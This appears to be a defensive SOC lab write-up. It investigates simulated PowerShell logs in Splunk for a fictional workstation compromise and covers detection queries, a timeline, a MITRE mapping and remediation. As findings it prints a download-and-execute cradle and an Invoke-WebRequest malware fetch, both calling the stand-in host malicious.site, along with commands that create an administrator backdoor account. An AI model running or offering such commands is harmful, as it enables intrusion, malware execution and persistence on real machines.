# Case 02 — Suspicious PowerShell Activity Detection

## Executive Summary
An attacker used PowerShell to compromise workstation WKSTN-04 at SecureCore 
Ltd. They hid their commands using encoding to avoid detection, created a 
secret administrator account to maintain access, downloaded malware from an 
external server, ran it, and then started mapping out the internal network. 
This was a structured and deliberate attack that went undetected because 
there was no PowerShell monitoring in place.

---

## Scenario
It is Wednesday morning at SecureCore Ltd. The SIEM fires an alert about 
suspicious PowerShell activity on workstation WKSTN-04. The alert shows 
PowerShell was launched with unusual parameters from a process it normally 
would not come from. As the analyst on duty the task is to investigate 
whether this is a legitimate administrator running a script or an attacker 
using PowerShell to compromise the machine.

The investigation uses Windows PowerShell execution logs loaded into Splunk 
to identify every malicious command, understand what the attacker did, and 
document the full scope of the compromise.

## Objective
Use Splunk to investigate suspicious PowerShell execution, identify all 
malicious commands and techniques used, understand the full scope of the 
attack, and produce a clear professional report of the findings.

## Tools Used
- Splunk Enterprise
- SPL (Search Processing Language)

## Dataset
- File: powershell-logs.csv
- Index: main
- Total Events: 16
- Log Fields: time, host, user, src_ip, process, parent_process,
  command_line, encoded, EventCode, status, description

---

## Background — Why Attackers Use PowerShell
PowerShell is built into every Windows machine and is trusted by the 
operating system. That is exactly why attackers love it. They do not 
need to bring any external tools because everything they need is already 
there. They can download files, run code, create accounts and explore 
the network all through PowerShell without triggering most antivirus tools.

The biggest warning signs to watch for in PowerShell investigations:

| Warning Sign | What it means |
|-------------|---------------|
| Parent process is cmd.exe | Someone opened a command prompt first and used it to launch PowerShell which is unusual for normal users |
| encoded is true | The command was deliberately scrambled so you cannot read what it does |
| Invoke-WebRequest | PowerShell is downloading something from the internet |
| New-LocalUser | A new user account is being created |
| Add-LocalGroupMember | Someone is being added to a privileged group |

---

## Investigation Steps

### Step 1 — Load and Review Raw Logs

**Query used:**
```
index=main source="powershell-logs.csv"
```

**What this does and why:**
This pulls the full dataset without any filtering. Before hunting for 
anything specific it is important to understand the environment first. 
What does normal PowerShell activity look like here? Once you know that, 
anything that does not fit becomes much easier to spot.

The key fields to pay attention to at this stage are the parent process 
column and the encoded column. These two alone can tell you a lot about 
whether something is suspicious before you even read the command itself.

**What was found:**
16 total events across multiple workstations. Most of the activity looked 
normal at first glance but WKSTN-04 immediately stood out. Its parent 
process and encoded field values were different from every other machine 
in the dataset. The screenshot below shows the full raw dataset as it 
appeared in Splunk.

![Raw log overview showing 16 PowerShell events across multiple 
workstations](screenshots/01-raw-logs.png)

---

### Step 2 — Full Dataset Overview

**Query used:**
```
index=main source="powershell-logs.csv"
| table time, user, extracted_host, parent_process, command_line,
  encoded, status, description
| sort time
```

**What this does and why:**
Putting all the key fields into one clean table makes it much easier to 
compare activity across workstations side by side. Including the encoded 
and parent process fields in the same view means you can spot the 
difference between normal and suspicious activity without running 
separate queries for each.

**What was found:**
The table made the contrast obvious straight away. WKSTN-01, WKSTN-02 
and WKSTN-03 all showed PowerShell launched from explorer.exe with 
normal readable commands. WKSTN-04 was completely different. Every 
single event on that machine showed cmd.exe as the parent process and 
several commands were encoded. The screenshot below shows this contrast 
clearly across all machines.

![Full dataset table showing normal activity on other workstations 
versus suspicious cmd.exe launched encoded commands on 
WKSTN-04](screenshots/02-full-table-overview.png)

---

### Step 3 — Isolate WKSTN-04 Activity

**Query used:**
```
index=main source="powershell-logs.csv" extracted_host=WKSTN-04
| table time, user, parent_process, command_line, description
| sort time
```

**What this does and why:**
Filtering to just WKSTN-04 and sorting by time lets you read the attack 
as a story from beginning to end. When you look at the commands in order 
you can see exactly how the attacker moved from one stage of the attack 
to the next. This is how you reconstruct what happened rather than just 
seeing individual events in isolation.

**What was found:**
10 events on WKSTN-04 between 09:20 and 09:45, all run by the admin 
account, all launched from cmd.exe. Reading them in order told a very 
clear story. The attacker started with encoded commands to hide their 
initial activity, then created a backdoor account, then downloaded and 
ran malware, then started exploring the system. The screenshot below 
shows the complete sequence of events on WKSTN-04.

![Complete WKSTN-04 activity timeline showing 10 events from encoded 
command execution through to post-exploitation 
reconnaissance](screenshots/03-wkstn04-full-activity.png)

---

### Step 4 — Detect Encoded PowerShell Commands

**Query used:**
```
index=main source="powershell-logs.csv" encoded=true
| table time, user, extracted_host, parent_process, command_line,
  description
| sort time
```

**What this does and why:**
Filtering specifically for encoded commands targets the most suspicious 
behaviour in the dataset. Legitimate administrators almost never need 
to encode their PowerShell commands. When you see encoding it usually 
means someone is deliberately trying to hide what they are doing from 
security tools and analysts. This type of query is commonly used as 
a detection rule in real SOC environments.

**What was found:**
Three encoded commands were executed on WKSTN-04 within two minutes 
between 09:20 and 09:22, all from cmd.exe. When decoded those strings 
translate to this:
```
IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload')
```

That command downloads malicious code from an external server and runs 
it directly in memory without saving a file first. This technique is 
designed to avoid antivirus detection because there is no file on disk 
to scan. The screenshot below shows the three encoded commands as they 
appeared in Splunk.

![Three encoded PowerShell commands executed within two minutes from 
cmd.exe on WKSTN-04](screenshots/04-encoded-commands.png)

---

### Step 5 — Backdoor Account Creation

**Query used:**
```
index=main source="powershell-logs.csv" command_line="*backdoor*"
| table time, user, extracted_host, command_line, description
| sort time
```

**What this does and why:**
Using a wildcard search for the word backdoor finds any command that 
references it regardless of the full command structure. This is important 
because persistence detection is one of the most critical parts of any 
investigation. If the attacker has created a way to get back in then 
simply resetting passwords is not enough to fix the problem.

**What was found:**
Two commands showed up back to back:

| Time | Command | What it did |
|------|---------|-------------|
| 09:23 | New-LocalUser -Name backdoor -Password P@ssw0rd123 | Created a hidden local account |
| 09:25 | Add-LocalGroupMember -Group Administrators -Member backdoor | Gave that account full admin rights |

The attacker created a secret account called backdoor and immediately 
gave it administrator privileges. Even if the security team caught the 
attack and reset the admin password the attacker could still log back 
in through this hidden account. The screenshot below shows both commands 
and their timestamps.

![Backdoor account creation and privilege escalation commands at 09:23 
and 09:25](screenshots/05-backdoor-creation.png)

---

### Step 6 — Malware Download and Execution

**Query used:**
```
index=main source="powershell-logs.csv" command_line="*payload.exe*"
| table time, user, extracted_host, command_line, description
| sort time
```

**What this does and why:**
Searching for the payload filename finds both the download and execution 
events together in one result. This confirms the complete malware 
deployment cycle and proves the system is actively compromised rather 
than just targeted. The save location in the command also reveals 
something about how the attacker works.

**What was found:**

| Time | Command | What it did |
|------|---------|-------------|
| 09:27 | Invoke-WebRequest -Uri http://malicious.site/payload.exe -OutFile C:\Windows\Temp\payload.exe | Downloaded malware from external server |
| 09:30 | Start-Process C:\Windows\Temp\payload.exe | Ran the malware |

The attacker saved the file to C:\Windows\Temp which is a folder that 
all users can write to and that many security tools tend to ignore. 
This is a deliberate choice. Once the file was saved it was immediately 
executed confirming the machine was fully compromised. The screenshot 
below shows both events.

![Malware downloaded from external server at 09:27 and executed at 
09:30](screenshots/06-malware-download-execution.png)

---

## 🕒 Attack Timeline

| Time | What happened |
|------|--------------|
| 09:20:00 | First encoded PowerShell command runs via cmd.exe |
| 09:21:00 | Second encoded command runs |
| 09:22:00 | Third encoded command runs |
| 09:23:00 | ⚠️ Backdoor user account created |
| 09:25:00 | ⚠️ Backdoor account given administrator privileges |
| 09:27:00 | ⚠️ Malware downloaded from http://malicious.site/payload.exe |
| 09:30:00 | ⚠️ Malware executed from C:\Windows\Temp |
| 09:35:00 | Attacker lists all local user accounts |
| 09:40:00 | Attacker checks network configuration |
| 09:45:00 | Attacker lists running processes |

---

## Findings Summary

| Finding | Detail |
|---------|--------|
| Compromised machine | WKSTN-04 |
| Attacker user context | admin |
| Attack start time | 2026-04-08 09:20:00 |
| Entry technique | Encoded PowerShell via cmd.exe |
| Encoded commands executed | 3 |
| Backdoor account created | backdoor |
| Backdoor privileges | Administrator |
| Malware source | http://malicious.site/payload.exe |
| Malware saved to | C:\Windows\Temp\payload.exe |
| Malware executed | Confirmed at 09:30 |
| Post-exploitation activity | User enumeration, network recon, process enumeration |
| Weakness exploited | No PowerShell monitoring or execution restrictions |
| Severity | Critical |

---

## MITRE ATT&CK Mapping

| Technique | ID | What was observed |
|-----------|-----|------------------|
| PowerShell | T1059.001 | PowerShell was used as the main attack tool throughout the entire compromise because it is trusted by Windows and harder to detect than external tools |
| Obfuscated Files or Information | T1027 | Three commands were Base64 encoded specifically to hide what they were doing from security monitoring tools and analysts reviewing logs |
| Create Local Account | T1136.001 | A hidden local account named backdoor was created to ensure the attacker could return even if the original compromise was discovered and the admin password was changed |
| Ingress Tool Transfer | T1105 | Malware was downloaded from an external server using Invoke-WebRequest which is a built-in PowerShell tool making it harder to block |
| System Information Discovery | T1082 | After deploying the malware the attacker spent time listing users, checking network settings and reviewing running processes to understand the environment before the next stage |
| Command and Scripting Interpreter | T1059.003 | PowerShell was launched from cmd.exe rather than directly which is a technique used to make the origin of the attack less obvious in logs |

---

## Conclusion
This was a well planned attack that used legitimate Windows tools to avoid 
detection at every stage. The attacker never needed to bring anything 
external onto the machine because PowerShell gave them everything they 
needed.

The encoding of the initial commands was the clearest sign of intent. 
Normal administrators do not encode their scripts. The fact that three 
encoded commands ran back to back from cmd.exe with no monitoring alert 
firing shows that the environment had no visibility into PowerShell 
activity at all.

What made this particularly dangerous was the backdoor account. Even if 
the security team had caught the malware and cleaned the machine, the 
backdoor account would have given the attacker a way back in. Finding 
and removing persistence mechanisms is just as important as removing 
the malware itself.

The post-exploitation activity at the end showed the attacker was not 
done. Listing users, checking the network and reviewing running processes 
are the steps an attacker takes when they are planning to move further 
into the environment. This machine was likely going to be used as a 
stepping stone for a broader attack.

This needs to be treated as an active compromise. The machine should be 
isolated immediately and a full forensic investigation carried out before 
it is returned to service.

---

## 🔑 Key Takeaways

- Encoding a PowerShell command is almost always a red flag. 
  Legitimate admins rarely need to do it
- Launching PowerShell from cmd.exe is unusual and worth investigating 
  every time you see it
- Creating a backdoor account means resetting passwords alone will not 
  fix the problem. You need to find and remove every persistence mechanism
- Saving files to C:\Windows\Temp is a common attacker technique because 
  the folder is writable and often ignored by security tools
- The post-exploitation commands showed the attacker was preparing for 
  more. Catching this early prevented a larger breach
- No PowerShell monitoring meant this attack ran for 25 minutes completely 
  undetected. Script block logging would have caught the encoded commands 
  immediately

---

## Recommended Actions
- Isolate WKSTN-04 from the network immediately
- Delete the backdoor local account
- Block http://malicious.site at the firewall
- Search every other machine for payload.exe in C:\Windows\Temp
- Reset admin credentials across all systems
- Enable PowerShell script block logging across the environment
- Set up a SIEM alert for any encoded PowerShell execution
- Set up a SIEM alert for PowerShell launched from cmd.exe
- Run a full forensic review of WKSTN-04 before returning it to service
